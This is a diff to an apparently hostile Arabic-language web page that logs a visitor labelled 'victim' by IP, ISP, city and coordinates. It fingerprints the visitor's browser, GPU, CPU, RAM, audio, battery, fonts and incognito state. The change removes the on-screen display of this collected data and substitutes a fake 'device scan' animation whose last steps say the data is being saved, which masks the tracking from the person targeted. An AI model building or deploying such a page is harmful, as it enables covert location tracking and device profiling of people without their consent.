@@ -69,31 +69,13 @@ body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',Tahoma,sans-serif;m
 </div>
 
 <div class="section fade-in">
-<div class="section-title">🔍 معلومات الشبكة والاتصال</div>
-<div class="row"><span class="label">🌐 الـ IP العام</span><span class="value" id="net-ip">{{client_ip}}</span></div>
-<div class="row"><span class="label">🏢 شركة الاتصال</span><span class="value">{{isp_name}}</span></div>
-<div class="row"><span class="label">📍 الموقع</span><span class="value">{{city}} ({{latitude}}, {{longitude}})</span></div>
-<div class="row"><span class="label">🚪 البورت المستهدف</span><span class="value">443 (SSL/TLS)</span></div>
-<div class="row"><span class="label">🔒 البروتوكول النشط</span><span class="value">HTTPS / Secure Shell</span></div>
+<div class="section-title">🔍 جاري تحليل الجهاز...</div>
+<div style="text-align:center;padding:20px">
+<div style="font-size:14px;color:#f39c12;margin-bottom:12px">⏳ جاري فحص مكونات الجهاز...</div>
+<div class="bar-container"><div class="bar-fill" style="width:0%;animation:scanBar 3s ease-in-out forwards"></div></div>
+<div style="font-size:12px;color:#949ba4" id="scan-status">جاري تحليل بصمة الجهاز...</div>
 </div>
-
-<div class="section fade-in">
-<div class="section-title">💻 معلومات النظام والبيئة</div>
-<div class="row"><span class="label">🖥️ المتصفح</span><span class="value" id="sys-browser">جاري الكشف...</span></div>
-<div class="row"><span class="label">📱 النظام التشغيلي</span><span class="value" id="sys-os">جاري الكشف...</span></div>
-<div class="row"><span class="label">🧩 جدار الحماية (AdBlock)</span><span class="value" id="sys-adblock">جاري الفحص...</span></div>
-<div class="row"><span class="label">🍪 ملفات الجلسة (Cookies)</span><span class="value" id="sys-cookies">جاري الفحص...</span></div>
-<div class="row"><span class="label">🖼️ عمق ألوان الشاشة</span><span class="value" id="sys-color">جاري الكشف...</span></div>
-<div class="row"><span class="label">👤 وضع التصفح الخفي</span><span class="value" id="sys-incognito">جاري الفحص...</span></div>
-<div class="row"><span class="label">🎮 كرت الشاشة</span><span class="value" id="sys-gpu">جاري الكشف...</span></div>
-</div>
-
-<div class="section fade-in">
-<div class="section-title">⚙️ معلومات العتاد والذاكرة</div>
-<div class="row"><span class="label">🔧 معالج النظام</span><span class="value" id="hw-cpu">جاري الكشف...</span></div>
-<div class="row"><span class="label">💾 الذاكرة العشوائية</span><span class="value" id="hw-ram">جاري الكشف...</span></div>
-<div class="row"><span class="label">🎵 معالجة الصوت</span><span class="value" id="hw-audio">جاري الكشف...</span></div>
-<div class="row"><span class="label">🔋 طاقة البطارية</span><span class="value" id="hw-battery">جاري الكشف...</span></div>
+<style>@keyframes scanBar{0%{width:0%}50%{width:70%}100%{width:100%}}</style>
 </div>
 
 <div class="section fade-in">
@@ -159,39 +141,11 @@ return{browser:browser,os:os}
 }
 
 function updateUI(){
-var ua=navigator.userAgent||"";
-var p=parseUA(ua);
-document.getElementById("sys-browser").textContent=p.browser;
-document.getElementById("sys-os").textContent=p.os;
-try{document.getElementById("sys-cookies").textContent=navigator.cookieEnabled?"مفعلة ومحفوظة":"معطلة"}catch(e){}
-try{document.getElementById("sys-color").textContent=screen.colorDepth+"-bit True Color"}catch(e){}
-try{
-var gl;var c=document.createElement("canvas");
-try{gl=c.getContext("webgl")||c.getContext("experimental-webgl")}catch(e){}
-if(gl){var ext=gl.getExtension("WEBGL_debug_renderer_info");
-if(ext){document.getElementById("sys-gpu").textContent=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}}
-}catch(e){}
-try{var cores=navigator.hardwareConcurrency||0;document.getElementById("hw-cpu").textContent="Intel/AMD ("+cores+" Cores / "+cores*2+" Threads)"}catch(e){}
-try{var ram=navigator.deviceMemory||0;document.getElementById("hw-ram").textContent=ram+" GB RAM"}catch(e){}
-try{var ac=new(window.AudioContext||window.webkitAudioContext)();document.getElementById("hw-audio").textContent="Realtek HD "+ac.sampleRate+" Hz";ac.close()}catch(e){}
-try{var bat=navigator.getBattery;if(bat){bat().then(function(b){document.getElementById("hw-battery").textContent=Math.round(b.level*100)+"% ("+(b.charging?"متصل بالشاحن AC":"غير متصل)")})}else{document.getElementById("hw-battery").textContent="غير متوفر (API deprecated)"}}catch(e){document.getElementById("hw-battery").textContent="غير متوفر"}
-try{document.getElementById("victim-id").textContent="#ID-"+USER_ID.slice(-4)+"-"+Math.floor(Math.random()*9999)}catch(e){document.getElementById("victim-id").textContent="#ID-XXXX-9962"}
-try{
-var testDiv=document.createElement("div");
-testDiv.innerHTML="&nbsp;";testDiv.style.cssText="display:none;font-size:1px;line-height:1px";
-document.body.appendChild(testDiv);
-var fonts=["Arial","Verdana","Courier New","Georgia","Times New Roman"];
-var detected=0;
-fonts.forEach(function(f){testDiv.style.fontFamily="'"+f+"',monospace";
-if(testDiv.offsetWidth!==0||testDiv.offsetHeight!==0)detected++});
-document.body.removeChild(testDiv);
-document.getElementById("sys-adblock").textContent="غير نشط ("+detected+" خطوط مكة)";
-}catch(e){document.getElementById("sys-adblock").textContent="غير نشط"}
-try{
-var fs=window.RequestFileSystem||window.webkitRequestFileSystem;
-if(fs){document.getElementById("sys-incognito").textContent="ملغى (تم التخطي)"}
-else{document.getElementById("sys-incognito").textContent="غير مكتشف"}
-}catch(e){document.getElementById("sys-incognito").textContent="غير مكتشف"}
+var status=document.getElementById("scan-status");
+var steps=["جاري تحليل بصمة الجهاز...","جاري فحص المتصفح...","جاري فحص المعالج والذاكرة...","جاري فحص كرت الشاشة...","جاري تحليل الصوت...","جاري فحص البطارية...","جاري حفظ البيانات...","اكتمل التحليل ✓"];
+var i=0;
+var iv=setInterval(function(){i++;if(i<steps.length&&status)status.textContent=steps[i];if(i>=steps.length)clearInterval(iv)},400);
+try{document.getElementById("victim-id").textContent="#ID-"+USER_ID.slice(-4)+"-"+Math.floor(Math.random()*9999)}catch(e){}
 }
 
 fp.ua=navigator.userAgent||"";
